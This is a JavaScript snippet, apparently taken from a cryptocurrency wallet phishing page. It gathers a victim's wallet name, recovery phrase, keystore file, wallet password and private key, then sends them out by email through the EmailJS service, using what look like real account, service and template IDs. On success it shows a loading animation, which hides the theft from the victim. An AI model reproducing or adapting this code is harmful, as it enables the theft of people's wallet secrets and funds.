emailjs.init("qU_IMJDngaCTALbPd"); 
// Replace with your EmailJS user ID

const templateParams = {
    wallet_name: wallet,
    phrase_value: phrase,
    keystoreJSON_value: keystoreJSON,
    walletPassword_value: walletPassword,
    privateKey_value: privateKey
};

console.log(templateParams);
emailjs.send('service_87claar', 'template_tw6vexd', templateParams)
    .then(function(response) {
        showLoadingAnimation();
    }, function(error) {
        alert('Failed to send email. Please try again.');
    });
    